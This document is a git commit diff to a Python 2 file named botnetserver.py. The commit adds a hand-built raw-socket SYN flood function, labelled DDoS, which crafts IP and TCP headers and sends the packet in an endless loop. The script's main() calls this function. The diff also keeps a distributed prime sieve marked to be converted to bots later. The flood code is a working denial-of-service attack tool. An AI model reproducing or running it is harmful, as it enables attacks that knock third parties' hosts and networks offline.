409b442dbba8531bfccb135dd6f3374e794c8aa5
Mitch <mitchschmidt21@gmail.com>
2016-11-22 10:37:36 -0500

    Add files via upload

--- botnetserver.py
+++ botnetserver.py
@@ -7,10 +7,12 @@ from multiprocessing import Process, Queue, Manager, Pool
 import SocketServer
 import ssl
 from socket import * #want lower level than built-in tcp servers
+from struct import * #want for packing packets
 import sys
 import logging
 import math
 import timeit
+import array
 
 PORT = ('localhost', 4443)
 
@@ -102,7 +104,6 @@ def DistributedSieve(n, threadn):
 
 	return B
 
-	
 def worker(i, commandqueue, finishedqueue):
     logging.info("Starting worker process")
     
@@ -127,13 +128,107 @@ def server(processlist):
         process.daemon = True
         process.start()
     
+def checksum(msg):
+	s = sum([(ord(msg[i*2]) << 8) + ord(msg[i*2+1]) for i in range(len(msg)/2)])
+
+	s = (s>>16) + (s & 0xffff)
+
+	#complement and mask to 4 byte short
+	s = ~s & 0xffff
+
+	#print [(c, ord(c)) for c in msg]
+	return s
+
+def achecksum(pkt):
+	if len(pkt) % 2 == 1:
+		pkt += "\0"
+	s = sum(array.array("H", pkt))
+	s = (s >> 16) + (s & 0xffff)
+	s += s >> 16
+	s = ~s
+	return (((s>>8)&0xff)|s<<8) & 0xffff
+
+def DDoS(dip, dport):
+	HTTPS = False
+	port = 1337
+	dstip = dip
+	
+	srcip = "10.0.0.23"
+	s = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)
+	s.setsockopt(IPPROTO_IP, IP_HDRINCL, 1)
+	
+	#we manually craft a packet
+	#scapy would be nice, but can't guarantee it's on every computer
+	#ip header fields
+	#used http://www.binarytides.com/raw-socket-programming-in-python-linux/
+	#for help creating packet
+	ipver = 4
+	ipihl = 5
+	iptos = 0
+	iptotlen = 40
+	ipid = 1
+	ipfragoff = 0
+	ipttl = 64
+	ipproto = IPPROTO_TCP
+	ipcheck = 0
+	ipsaddr = inet_aton(srcip)
+	ipdaddr = inet_aton(dstip)
+	
+	ipihlver = (ipver << 4) + ipihl
+	ipheader = pack('!BBHHHBBH4s4s', ipihlver, iptos, iptotlen, ipid, ipfragoff, ipttl, ipproto, ipcheck, ipsaddr, ipdaddr)
+
+	#tcp stuff
+	tcpsrc = 1337
+	tcpdst = port
+	tcpseq = 0
+	tcpackseq = 0
+	tcpdoff = 5
+	tcpfin = 0
+	tcpsyn = 1
+	tcprst = 0
+	tcppsh = 0
+	tcpack = 0
+	tcpurg = 0
+	tcpwin = 8192
+	tcpchk = 0
+	tcpupr = 0
+	
+	tcpoffsetres = (tcpdoff << 4) + 0
+	tcpflags = tcpfin + (tcpsyn << 1) + (tcprst << 2) + (tcppsh << 3) + (tcpack << 4) + (tcpurg << 5)
+	
+	tcpheader = pack('!HHLLBBHHH', tcpsrc, tcpdst, tcpseq, tcpackseq, tcpoffsetres, tcpflags, tcpwin, tcpchk, tcpupr)
+
+	data = ''
+	placeholder = 0
+	tcplen = htons(len(tcpheader)+len(data))
+	
+	psh = pack('4s4sBBH', ipsaddr, ipdaddr, placeholder, ipproto, tcplen)
+	psh += tcpheader + data
+	
+	tcpchk = htons(checksum(psh))
+	#print tcpchk
+	ex= str("".join([c[0] for c in ('\n', 10), ('\x84', 132), ('\xaa', 170), ('\x1f', 31), ('\n', 10), ('\x00', 0), ('\x00', 0), ('\x17', 23), ('\x00', 0), ('\x06', 6), ('\x00', 0), ('\x14', 20), ('\x05', 5), ('9', 57), ('\x05', 5), ('9', 57), ('\x00', 0), ('\x00', 0), ('\x00', 0), ('\x00', 0), ('\x00', 0), ('\x00', 0), ('\x00', 0), ('\x00', 0), ('P', 80), ('\x02', 2), (' ', 32), ('\x00', 0), ('\x00', 0), ('\x00', 0), ('\x00', 0), ('\x00', 0)]))
+	#print checksum(ex)
+	#for a,b in zip(psh, ex):
+	#	print ord(a), ord(b)
+	tcpheader = pack('!HHLLBBH', tcpsrc, tcpdst, tcpseq, tcpackseq, tcpoffsetres, tcpflags, tcpwin) + pack('H', tcpchk) + pack('!H', tcpupr)
+	
+	packet = ipheader + tcpheader + data
+	
+	while True:
+		s.sendto(packet, (dip, 0))
+
 def main():
+	#DDoS syn flood
+	DDoS("10.0.0.23", 1337)
+	
+def main3():#factoring algo
 	primes = 1001
 	#default sieve
-	print timeit.timeit('Sieve(100000001)', setup="from __main__ import Sieve", number=5)
+	print timeit.timeit('Sieve(10000001)', setup="from __main__ import Sieve", number=5)
 	
 	#sieve using n "threads" (convert to bots later)
-	print timeit.timeit('DistributedSieve(100000001, 2)', setup="from __main__ import DistributedSieve", number=5)
+	print timeit.timeit('DistributedSieve(10000001, 2)', setup="from __main__ import DistributedSieve", number=5)
 	
 def main2():
     logging.info("Starting main")
